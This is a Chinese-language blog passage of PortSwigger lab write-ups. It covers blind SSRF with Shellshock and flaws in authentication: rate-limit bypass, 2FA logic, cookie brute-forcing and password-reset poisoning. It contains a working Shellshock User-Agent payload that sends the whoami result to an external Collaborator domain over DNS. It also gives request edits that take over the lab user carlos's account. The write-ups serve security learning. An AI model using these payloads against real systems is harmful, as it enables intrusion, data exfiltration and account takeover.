<li>切换至Repeater标签页。选中Referer头部字段，右键点击选择”插入协作器有效负载”，用Burp协作器生成的域名替换原始域名。发送请求。</li>
<li>切换至协作器标签页，点击”立即轮询”。若未显示交互记录，请等待数秒后重试，因服务器端命令采用异步执行机制。</li>
<li>您将看到应用程序因您的有效负载触发的DNS及HTTP交互记录。</li>
</ol>
<p><img src="/images/image-20251203103051-3zjeuj8.png" alt="image"></p>
<p><img src="/images/image-20251203103058-6h9r8qr.png" alt="image"></p>
<h2 id="Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Lab: Blind SSRF with Shellshock exploitation"></a>Lab: Blind SSRF with Shellshock exploitation</h2><p>本网站使用分析软件，当产品页面加载时会获取Referer头中指定的URL。为完成实验，请利用此功能对192.168.0.X网段内端口8080的内部服务器发起盲SSRF攻击。在盲攻击中，需向该内部服务器发送Shellshock有效载荷，以窃取操作系统用户的名称。</p>
<ol>
<li>在Burp Suite Professional中，从BApp商店安装Collaborator Everywhere扩展。</li>
<li>将实验室域名添加至Burp Suite的目标范围，使Collaborator Everywhere能定位该域名。</li>
<li>浏览该网站。</li>
<li>观察到加载产品页面时，会通过Referer头部触发与Burp Collaborator的HTTP交互。</li>
<li>观察到HTTP交互中包含HTTP请求内的User-Agent字符串。</li>
</ol>
<p><img src="/images/image-20251203104849-o6y2cp3.png" alt="image"></p>
<ol>
<li>将产品页面的请求发送至Burp Intruder</li>
<li>转至Collaborator标签页生成唯一Burp Collaborator有效载荷。将此内容放入Shellshock有效负载</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">User-Agent:</span> <span class="string">()</span> &#123; <span class="string">:;</span> &#125;<span class="string">;</span> <span class="string">/usr/bin/nslookup</span> <span class="string">$(whoami).k9udcmqymw0o7c46r2xz74tj8ae12sqh.oastify.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://192.168.0.1:8080</span></span><br></pre></td></tr></table></figure>

<ol>
<li>将Burp Intruder请求中的User-Agent字符串替换为包含Collaborator域名的Shellshock有效负载。</li>
<li>将Referer头修改为<a href="http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。">http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。</a> 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1</li>
<li>攻击完成后，转到协作方选项卡，点击立即轮询。若未显示任何交互记录，请等待数秒后重试，因服务器端命令采用异步执行。此时应可见由后端系统发起的DNS交互记录——该系统正是成功盲SSRF攻击的目标。操作系统用户的名称将出现在DNS子域中。</li>
<li>完成实验操作，请输入操作系统用户的名称。</li>
</ol>
<p><img src="/images/image-20251203105814-zeuf320.png" alt="image"></p>
<p><img src="/images/image-20251203111201-ivd9azs.png" alt="image"></p>
<p><img src="/images/image-20251203113203-aatvzlr.png" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;</span><br></pre></td></tr></table></figure>

<p>这是 Shellshock 漏洞的标志性特征。</p>
<ul>
<li><strong>原理：</strong>  在受影响的 Bash 版本中，如果环境变量的值以函数定义 <code>() &#123; ... &#125;</code> 开头，Bash 会在导入该环境变量时执行函数定义后面的额外命令。</li>
<li><strong>上下文：</strong>  在 Web服务器（如使用 CGI 的 Apache）中，HTTP 请求头（如 <code>User-Agent</code>​）通常会被转换为环境变量（如 <code>HTTP_USER_AGENT</code>​）。因此，攻击者通过修改 <code>User-Agent</code> 就可以向 Bash 注入恶意环境变量。</li>
</ul>
<p>‍</p>
<ol>
<li><strong>目标服务器</strong>向本地 DNS 服务器发起查询请求：“请告诉我 <code>root.k9udcm....oastify.com</code> 的 IP 是多少？”</li>
<li>如果不在此缓存中，本地 DNS 会逐级查询，最终请求会到达负责解析 <code>oastify.com</code>​ 的​<strong>权威名称服务器</strong>。</li>
<li><strong>攻击者</strong>控制着这台权威名称服务器（在这个例子中，<code>oastify.com</code> 是 Burp Suite Collaborator 的专用域名）。</li>
<li><strong>捕获：</strong>  攻击者在名称服务器的日志中看到了一条查询记录，记录中包含了 <code>root</code> 这个前缀。</li>
<li><strong>结果：</strong>  攻击者成功获知目标服务器是以 <code>root</code> 权限运行的，且证明了该服务器存在 Shellshock 漏洞。</li>
</ol>
<hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" data-id="cmkkn2g3x0000agvs4wmc8k45" data-title="3.Server-side request forgery (SSRF)" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Authentication身份验证" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" class="article-date">
  <time class="dt-published" datetime="2026-01-12T08:58:32.000Z" itemprop="datePublished">2026-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">2.Authentication身份验证</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.13</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>身份验证Authentication的关键在于确认用户是其声称的身份，区别于授权authorization确认用户是否被允许执行某个操作，例如，身份验证确定尝试使用用户名Carlos访问网站的人是否真的是创建该账户的人。一旦对Carlos进行了身份验证，他们的权限将决定他们被授权执行哪些操作。因此，身份验证漏洞可能允许攻击者访问敏感数据和功能，它们暴露了额外的攻击面。</p>
<h1 id="2-Vulnerabilities-in-password-based-login"><a href="#2-Vulnerabilities-in-password-based-login" class="headerlink" title="2. Vulnerabilities in password-based login"></a>2. Vulnerabilities in password-based login</h1><h2 id="2-1-Brute-force-attacks"><a href="#2-1-Brute-force-attacks" class="headerlink" title="2.1 Brute-force attacks"></a>2.1 Brute-force attacks</h2><h3 id="2-1-1-usernames"><a href="#2-1-1-usernames" class="headerlink" title="2.1.1 usernames"></a>2.1.1 usernames</h3><ol>
<li>可识别的模式：例如电子邮件地址。例如，我们经常看到企业登录名采用<a href="mailto:&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;">&#x66;&#105;&#x72;&#115;&#116;&#110;&#97;&#x6d;&#x65;&#x2e;&#x6c;&#x61;&#115;&#x74;&#110;&#97;&#109;&#101;&#x40;&#115;&#x6f;&#109;&#101;&#x63;&#x6f;&#x6d;&#x70;&#97;&#x6e;&#x79;&#x2e;&#99;&#111;&#109;</a>的格式。</li>
<li>可预测的用户名：即使没有明显的模式，有时甚至会使用可预测的用户名（例如admin或administrator）来创建高权限账户。</li>
<li>收集资料：能否在未登录的情况下访问用户个人资料？即使个人资料的实际内容被隐藏，个人资料中使用的名称有时也与登录用户名相同。您还应该检查HTTP响应，看看是否公开了任何电子邮件地址。有时，响应中会包含高级特权用户（例如管理员或IT支持人员）的电子邮件地址。</li>
</ol>
<h3 id="2-1-2-passwords"><a href="#2-1-2-passwords" class="headerlink" title="2.1.2 passwords"></a>2.1.2 passwords</h3><p>利用&#x3D;&#x3D;对人类行为的基本了解&#x3D;&#x3D;来利用用户无意中引入到这个系统中的漏洞。用户通常不会使用随机字符组合来创建强密码，而是会尝试使用他们可以记住的密码，并试图将其塞入符合密码策略的密码。例如，如果不允许使用mypassword，用户可能会尝试使用Mypassword1!</p>
<h3 id="2-1-3-Username-enumeration"><a href="#2-1-3-Username-enumeration" class="headerlink" title="2.1.3 Username enumeration"></a>2.1.3 Username enumeration</h3><p>用户名枚举是指攻击者能够观察网站行为的变化，以便确定给定的用户名是否有效。</p>
<p>用户名枚举通常发生在登录页面，例如，当您输入有效的用户名但密码错误时，或者在注册表单上输入已存在的用户名时。这大大减少了暴力破解登录所需的时间和精力，因为攻击者能够快速生成一个有效用户名的简短列表。</p>
<p>在尝试对登录页面进行暴力破解时，您应该特别注意以下任何差异：</p>
<ol>
<li>状态码 ：在暴力破解攻击期间，返回的HTTP状态码对于绝大多数猜测可能是相同的，因为它们中的大多数都是错误的。如果某个猜测返回的状态码不同，这强烈表明用户名是正确的。对于网站来说，无论结果如何，始终返回相同的状态码是最佳实践，但这种做法并不总是被遵循。</li>
<li>错误消息：有时，返回的错误消息会根据用户名和密码都是否正确或只有密码不正确而有所不同。在两种情况下都使用相同的通用消息是最佳实践，但有时会出现小的打字错误。即使只有一个字符的位置不对，也会使两条消息有所不同，即使在呈现的页面上看不到该字符。</li>
<li>响应时间：如果大多数请求的处理响应时间都相似，那么任何与此不同的请求都表明幕后可能发生了不同的事情。这也表明猜测的用户名可能是正确的。例如，网站可能只有在用户名有效的情况下才会检查密码是否正确。这额外的步骤可能会导致响应时间略有增加。这可能是微妙的，但攻击者可以通过输入一个过长的密码来使这种延迟更加明显，网站处理这个过长的密码需要明显更长的时间。</li>
</ol>
<p><img src="/images/image-20260111213249-e1e5qtj.png" alt="image"></p>
<h2 id="2-2-Flawed-brute-force-protection"><a href="#2-2-Flawed-brute-force-protection" class="headerlink" title="2.2 Flawed brute-force protection"></a>2.2 Flawed brute-force protection</h2><p>从逻辑上讲，暴力保护的核心是尽可能地使自动化过程变得困难，并减缓攻击者尝试登录的速度。防止暴力攻击的两种最常见的方法是:</p>
<ol>
<li>如果远程用户多次尝试失败，锁定他们试图访问的账户。</li>
<li>如果远程用户在短时间内多次尝试登录，阻止他们的IP地址。</li>
</ol>
<p>这两种方法都提供了不同程度的保护，但都没有固若金汤，尤其是如果实现逻辑有缺陷的话。例如，如果你多次登录失败，有时可能会发现你的IP被屏蔽了。在某些实现中，如果IP所有者成功登录，失败尝试的次数计数器会重置。这意味着攻击者只需要每隔几次尝试就登录到他们自己的账户，就可以防止达到这个限制。在这种情况下，只需在字典中的每个间隔包含您自己的登录凭据，就足以使这种防御变得几乎毫无用处。</p>
<p>账户锁定无法防止凭证填充攻击。这种攻击方式涉及使用一个由用户名:密码对组成的巨大字典，这些字典由数据泄露中窃取的真实登录凭证组成。凭证填充依赖于一个事实，即许多人在多个网站上重复使用相同的用户名和密码，因此，字典中一些受损的凭证也有可能在目标网站上有效。账户锁定无法防止凭证填充，因为每个用户名只被尝试一次。凭证填充尤其危险，因为它有时会导致攻击者只需一次自动攻击就可以破坏许多不同的账户。</p>
<h3 id="2-2-1-User-rate-limiting"><a href="#2-2-1-User-rate-limiting" class="headerlink" title="2.2.1 User rate limiting"></a>2.2.1 User rate limiting</h3><p>网站防止暴力攻击的另一种方法是限制用户速率。在这种情况下，在短时间内发出太多登录请求会导致您的 IP 地址被屏蔽。通常，IP 只能通过以下一种方式解除屏蔽：</p>
<ol>
<li>在一段时间后自动解除屏蔽</li>
<li>由管理员手动解除屏蔽</li>
<li>用户在成功完成验证码后手动解除屏蔽</li>
</ol>
<p>与账户锁定相比，有时更倾向于使用用户速率限制，因为它不太容易受到用户名枚举和拒绝服务攻击。</p>
<p>由于限制是基于从用户 IP 地址发送的 HTTP 请求的速率，因此，如果您能想出如何通过一个请求猜测多个密码，有时也可以绕过此防御。</p>
<ol>
<li><p>运行Burp后，检查登录页面。注意，POST &#x2F;login请求以JSON格式提交登录凭据。将此请求发送到Burp Repeater中，将密码的单个字符串值替换为包含所有候选密码的字符串数组。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&quot;&#x27;</span>+line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&#x27;&quot;,&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\&quot;2\&quot;]&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/images/image-20251115175218-6pnqf55.png" alt="image"></p>
<ol start="2">
<li><p>发送请求。这将返回一个302响应。</p>
<p><img src="/images/image-20251115182124-othyg0y.png" alt="image"></p>
</li>
<li><p>右键单击此请求并选择在浏览器中显示响应。复制URL并将其加载到浏览器中。页面加载，您以carlos的身份登录。拿到session.</p>
</li>
</ol>
<h2 id="2-3-HTTP-basic-authentication"><a href="#2-3-HTTP-basic-authentication" class="headerlink" title="2.3 HTTP basic authentication"></a>2.3 HTTP basic authentication</h2><p>尽管HTTP基本认证（HTTP basic authentication）相对简单且易于实现，但它的安全性并不高，因此现在已不常用。在进行HTTP基本认证时，客户端会从服务器接收一个认证令牌（authentication token），该令牌是通过将用户名和密码连接起来，然后使用Base64编码生成的。这个令牌由浏览器存储和管理，浏览器会自动将其添加到后续每个请求的Authorization头部中，格式如下：Authorization: Basic base64(username:password)</p>
<p>以下是HTTP基本认证被认为不安全的原因：</p>
<p>它需要在每次请求时反复发送用户的登录凭证（login credentials）。除非网站同时也实现了HSTS（HTTP Strict Transport Security），否则用户的凭证很容易在中间人攻击（man-in-the-middle attack）中被截获。<br>HTTP基本认证的实现通常不支持抵御暴力攻击（brute-force protection）。由于令牌完全由静态值组成，因此很容易受到暴力攻击。<br>HTTP基本认证特别容易受到与会话相关的攻击（session-related exploits），尤其是CSRF（跨站请求伪造，Cross-site request forgery），而它本身并不能提供针对CSRF的保护。</p>
<p>在某些情况下，利用脆弱的HTTP基本认证可能只会让攻击者访问到一个看起来无关紧要的页面。但是，除了提供一个额外的攻击面之外，以这种方式暴露的凭证可能会在其他更机密的上下文中被重用。</p>
<h1 id="3-Vulnerabilities-in-multi-factor-authentication"><a href="#3-Vulnerabilities-in-multi-factor-authentication" class="headerlink" title="3. Vulnerabilities in multi-factor authentication"></a>3. Vulnerabilities in multi-factor authentication</h1><p>许多网站仅依赖使用密码的单因素认证来验证用户。然而，有些网站要求用户通过多个认证因素来证明自己的身份。对于大多数网站来说，验证生物识别因素是不现实的。但是，越来越多地看到基于您所知道的内容和您所拥有的内容的强制性和可选性的两因素认证（2FA）。这通常要求用户输入传统的密码和他们拥有的带外物理设备上的临时验证码。</p>
<p><img src="/images/image-20251115184721-kkvcgbj.png" alt="image"></p>
<p>虽然攻击者有时可能会获得一个基于知识的单一因素，例如密码，但同时从带外源获得另一个因素要困难得多。因此，两因素认证比单因素认证更安全。</p>
<p>实施不当的两因素认证可能会被击败，甚至完全绕过，就像单因素认证一样。值得注意的是，只有通过验证多个不同的因素，才能完全实现多因素认证的好处。</p>
<p>以两种不同的方式验证相同的因素并不是真正的两因素认证。基于电子邮件的2FA就是这样一个例子。虽然用户必须提供密码和验证码，但访问验证码仅依赖于他们知道自己的电子邮件账户的登录凭据。因此，知识认证因素只是被验证了两次。</p>
<p>2FA 的「安全增量」来自「不同类型因素的互补」，而非「同一因素的重复验证」。电子邮件 2FA 的两次验证（密码 + 邮箱验证码），本质都是验证「用户知道什么」，没有引入「持有物」或「生物特征」等独立因素，因此不算真正的 2FA—— 它只是「加强版的单因素认证」，而非符合标准的双因素认证。</p>
<h2 id="3-1-2FA-simple-bypass"><a href="#3-1-2FA-simple-bypass" class="headerlink" title="3.1 2FA simple bypass"></a>3.1 2FA simple bypass</h2><p>有时，二次认证的实施存在缺陷，以至于可以被完全绕过。如果用户首先被提示输入密码，然后在另一个页面上被提示输入验证码，那么用户在输入验证码之前实际上已经处于“登录”状态。在这种情况下，值得测试一下在完成第一步认证后，你是否可以直接跳转到“仅登录”页面。有时，你会发现网站在实际加载页面之前，并没有检查你是否完成了第二步认证。</p>
<p>‍</p>
<h2 id="3-2-Flawed-two-factor-verification-logic"><a href="#3-2-Flawed-two-factor-verification-logic" class="headerlink" title="3.2 Flawed two-factor verification logic"></a>3.2 Flawed two-factor verification logic</h2><p>有时，双因素身份验证中的&#x3D;&#x3D;逻辑缺陷&#x3D;&#x3D;意味着，在用户完成了初始登录步骤后，网站没有充分验证同一用户是否正在完成第二步。例如，用户在第一步中使用其正常凭据登录，如下所示：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/first HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">...</span><br><span class="line">username=carlos&amp;password=qwerty</span><br></pre></td></tr></table></figure>

<p>然后，在进入登录过程的第二步之前，他们会被分配一个与他们的帐户相关的cookie：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: account=carlos</span><br><span class="line"></span><br><span class="line">GET /login-steps/second HTTP/1.1</span><br><span class="line">Cookie: account=carlos</span><br></pre></td></tr></table></figure>

<p>当提交验证码时，请求使用这个cookie来确定用户正在尝试访问哪个帐户：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=carlos</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>在这种情况下，攻击者可以使用自己的凭据登录，但在提交验证码时将帐户cookie的值更改为任意用户名。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login-steps/second HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: account=victim-user</span><br><span class="line">...</span><br><span class="line">verification-code=123456</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;如果攻击者能够暴力破解验证码，这将是极其危险的，因为这将允许他们完全基于用户名登录任意用户的帐户。他们甚至不需要知道用户的密码。&#x3D;&#x3D;</p>
<p>‍</p>
<p>在运行 Burp 的情况下，登录您自己的账户并检查 2FA 验证过程。请注意，在 POST &#x2F;login2 请求中，verify 参数用于确定正在访问哪个用户的账户。<br>注销您的账户。<br>将 GET &#x2F;login2 请求发送到 Burp Repeater。将 verify 参数的值更改为 carlos 并发送请求。这将确保为 Carlos 生成一个临时的 2FA 代码。</p>
<p><img src="/images/image-20251115193608-lybbuiv.png" alt="image"><br>转到登录页面并输入您的用户名和密码。然后，提交一个无效的 2FA 代码。<br>将 POST &#x2F;login2 请求发送到 Burp Intruder。<br>在 Burp Intruder 中，将 verify 参数设置为 carlos 并向 mfa-code 参数添加一个有效负载位置。对验证码进行暴力破解。<br>在浏览器中加载 302 响应。</p>
<p><img src="/images/image-20251115193928-58dtuou.png" alt="image"></p>
<p>要模拟正常用户的行为，有些要素是需要有行为模拟后才会触发的，比如安全的验证码。</p>
<h1 id="4-Vulnerabilities-in-other-authentication-mechanisms"><a href="#4-Vulnerabilities-in-other-authentication-mechanisms" class="headerlink" title="4.Vulnerabilities in other authentication mechanisms"></a>4.Vulnerabilities in other authentication mechanisms</h1><p>除了基本的登录功能之外，大多数网站还提供&#x3D;&#x3D;补充功能&#x3D;&#x3D;，允许用户管理自己的账户。例如，用户通常可以在忘记密码时更改密码或重置密码。这些机制也可能引入攻击者可以利用的漏洞。网站通常会注意避免在其登录页面中出现众所周知的漏洞。但是，人们很容易忽视一点，那就是你需要采取类似的措施来确保相关功能的健壮性。</p>
<p>在攻击者能够创建自己的账户的情况下，这一点尤其重要，因为这样攻击者就可以轻松地访问这些额外的页面。</p>
<h2 id="4-1-Brute-forcing-a-stay-logged-in-cookie"><a href="#4-1-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="4.1 Brute-forcing a stay-logged-in cookie"></a>4.1 Brute-forcing a stay-logged-in cookie</h2><p>许多网站在用户登录时提供了一个选项，即在关闭浏览器后仍然保持登录状态。这通常是一个简单的复选框，标记为“记住我”或“保持登录状态”。</p>
<p>此功能通常通过生成某种“remember me”令牌来实现，然后将该令牌存储在持久性 cookie 中。</p>
<p>由于拥有此 cookie 可以有效地让您绕过整个登录过程，因此此 cookie 最好是难以猜测的。</p>
<p>但是，一些网站会根据可预测的静态值组合（例如用户名和时间戳）生成此 cookie。有些甚至使用密码作为 cookie 的一部分。</p>
<p>如果攻击者能够创建自己的账户，这种方法尤其危险，因为他们可以研究自己的 cookie，并可能推断出它是如何生成的。一旦他们弄清楚了公式，他们就可以尝试暴力破解其他用户的 cookie 以访问他们的账户。</p>
<p>一些网站假设，如果 cookie 以某种方式加密，它将不可猜测，即使它确实使用静态值。如果做得正确，这可能是正确的，但是使用简单的双向编码（如 Base64）天真地“加密”cookie 根本不提供任何保护。即使使用带有单向散列函数 的正确加密也不是完全安全的。如果攻击者能够轻松识别散列算法，并且不使用盐，他们就可以通过简单地对单词表进行散列来潜在地对 cookie 进行暴力破解。如果对 cookie 猜测没有类似的限制，则可以使用此方法绕过登录尝试限制。</p>
<p>‍</p>
<p><img src="/images/image-20251116001552-rxy2f0d.png" alt="image"></p>
<p>是base64(username+md5(密码))</p>
<p><img src="/images/image-20251116002141-30623tz.png" alt="image"></p>
<p>在 Burp Intruder 中，请注意 stay-logged-in cookie 已自动添加为有效负载位置。添加您自己的密码作为单个有效负载。<br>在“有效负载处理”下，依次添加以下规则。这些规则将在请求提交之前依次应用于每个有效负载。<br>• 哈希：MD5<br>• 添加前缀：wiener:<br>• 编码：Base64 编码</p>
<h2 id="3-3-Resetting-user-passwords"><a href="#3-3-Resetting-user-passwords" class="headerlink" title="3.3 Resetting user passwords"></a>3.3 Resetting user passwords</h2><p>在实践中，一些用户会忘记他们的密码，所以有一种方法让他们重置密码是很常见的。由于通常的基于密码的身份验证在这种情况下显然是不可能的，网站必须依靠其他方法来确保真正的用户正在重置自己的密码。因此，密码重置功能本质上是危险的，需要安全地实现。这个特性通常有几种不同的实现方式，具有不同程度的漏洞。</p>
<h3 id="3-3-1-Sending-passwords-by-email"><a href="#3-3-1-Sending-passwords-by-email" class="headerlink" title="3.3.1 Sending passwords by email"></a>3.3.1 Sending passwords by email</h3><p>如果一个网站最初就安全地处理密码，那么就不应该向用户发送他们当前的密码。相反，一些网站会生成一个新密码，并通过电子邮件将其发送给用户。一般来说，应避免通过不安全的渠道发送持久性密码。在这种情况下，安全性依赖于生成密码在很短的时间后过期，或者用户立即再次更改密码。否则，这种方法很容易受到中间人攻击。鉴于收件箱是持久的，并且并不是真正为安全存储机密信息而设计的，因此电子邮件通常也不被认为是安全的。许多用户还会在不安全渠道中的多个设备之间自动同步他们的收件箱。</p>
<h3 id="3-3-2-Resetting-passwords-using-a-URL（broken-logic）"><a href="#3-3-2-Resetting-passwords-using-a-URL（broken-logic）" class="headerlink" title="3.3.2 Resetting passwords using a URL（broken logic）"></a>3.3.2 Resetting passwords using a URL（broken logic）</h3><p>一种更健壮的密码重置方法是向用户发送一个唯一的URL，将他们带到密码重置页面。这种方法的安全性较低的实现方式是使用一个容易猜测的参数来标识要重置哪个账户，例如：<a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?user=victim-user">http://vulnerable-website.com/reset-password?user=victim-user</a></p>
<p>在这个例子中，攻击者可以更改user参数，以引用他们已经识别的任何用户名。然后，他们将被直接带到一个页面，在那里他们可以潜在地为这个任意用户设置一个新密码。</p>
<p>这个过程的一个更好的实现方法是生成一个高熵、难以猜测的令牌，并基于该令牌创建重置URL。在最佳情况下，这个URL应该不提供有关哪个用户的密码正在被重置的提示。</p>
<p><a target="_blank" rel="noopener" href="http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8">http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8</a></p>
<p>当用户访问这个URL时，系统应该检查这个令牌在后台是否存在，如果存在，应该检查它是用来重置哪个用户的密码的。</p>
<p>这个令牌应该在短时间内过期，并在密码重置后立即销毁。然而，一些网站在重置表单提交时未能再次验证令牌。在这种情况下，攻击者可以简单地访问他们自己账户的重置表单，删除令牌，并利用这个页面来重置任意用户的密码。</p>
<p><img src="/images/image-20251116154147-yc4kat6.png" alt="image"></p>
<p><img src="/images/image-20251116154230-wyfa071.png" alt="image"></p>
<p>输入重置密码的链接后，点击链接跳转</p>
<p><img src="/images/image-20251116154346-b3s08a2.png" alt="image"><img src="/images/image-20251116154641-xfd9bf9.png" alt="image"></p>
<ol>
<li>运行Burp Suite，单击“忘记密码？”链接，并输入您自己的用户名。</li>
<li>单击“电子邮件客户端”按钮，查看已发送的密码重置电子邮件。单击电子邮件中的链接，并将密码重置为您想要的任何密码。</li>
<li>在Burp中，转到“代理”&gt;“HTTP历史记录”，并研究密码重置功能的请求和响应。请注意，重置令牌作为重置电子邮件中的URL查询参数提供。请注意，提交新密码时，POST &#x2F;forgot-password?temp-forgot-password-token请求包含作为隐藏输入的用户名。将此请求发送到Burp Repeater。</li>
<li>在Burp Repeater中，请注意，即使您删除URL和请求正文中temp-forgot-password-token参数的值，密码重置功能仍然有效。这确认了在提交新密码时不会检查令牌。</li>
<li>在浏览器中，再次请求密码重置并再次更改密码。将POST &#x2F;forgot-password?temp-forgot-password-token请求再次发送到Burp Repeater。</li>
<li>在Burp Repeater中，删除URL和请求正文中temp-forgot-password-token参数的值。将username参数更改为carlos。将新密码设置为所需的任何密码，然后发送请求。</li>
<li>在浏览器中，使用您刚刚设置的新密码登录Carlos的帐户。单击“我的帐户”以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251116155906-4rjz1yx.png" alt="image"></p>
<p>‍</p>
<h3 id="3-3-3-Lab-Password-reset-poisoning-via-middleware"><a href="#3-3-3-Lab-Password-reset-poisoning-via-middleware" class="headerlink" title="3.3.3 Lab: Password reset poisoning via middleware"></a>3.3.3 Lab: Password reset poisoning via middleware</h3><p>这个实验室很容易受到密码重置中毒的影响。用户carlos会不小心点击他收到的电子邮件中的任何链接。要解决实验室的问题，登录卡洛斯的账户。</p>
<p>您可以使用以下凭据登录自己的帐户：wiener:peter。发送到该帐户的任何电子邮件都可以通过漏洞利用服务器上的电子邮件客户端读取。</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，研究密码重置功能。可以看到，一封包含唯一重置令牌的链接通过电子邮件发送。</li>
<li>将POST &#x2F;forgot-password请求发送到Burp Repeater。注意，X-Forwarded-Host头是受支持的，您可以使用它将动态生成的重置链接指向任意域。</li>
<li>转到攻击服务器并记下您的攻击服务器URL。</li>
<li>返回到Burp Repeater中的请求，并使用您的攻击服务器URL添加X-Forwarded-Host头(&#x3D;&#x3D;纯域名&#x3D;&#x3D;)：X-Forwarded-Host: exploit-0a040027049c72d7801b48f2018f000b.exploit-server.net&#x2F;exploit</li>
<li>将username参数更改为carlos并发送请求。</li>
</ol>
<p><img src="/images/image-20251116162000-yd018ep.png" alt="image"><br>转到攻击服务器并打开访问日志。您应该看到一个包含受害者的令牌作为查询参数的GET &#x2F;forgot-password请求。记下此令牌。<br>返回到您的电子邮件客户端并复制有效的密码重置链接（不是指向攻击服务器的链接）。将此粘贴到浏览器中，并将temp-forgot-password-token参数的值更改为您从受害者那里窃取的值。</p>
<p><img src="/images/image-20251116162205-lvi35wl.png" alt="image"><br>加载此URL并为Carlos的帐户设置一个新密码。<br>使用新密码登录Carlos的帐户以解决实验室问题。</p>
<p>因为攻击者的username设置为了受害者，所以邮件会被发到受害者的邮箱里面，网站使用了 <code>X-Forwarded-Host</code>​ 头中的恶意域名来作为链接的基准，它的主要作用是在请求通过一个或多个<strong>代理服务器</strong>（如负载均衡器、反向代理或CDN）到达最终的后端应用服务器时，告知后端应用<strong>原始客户端请求中使用的</strong> <strong>​<code>Host</code>​</strong>​ <strong>域名</strong>。</p>
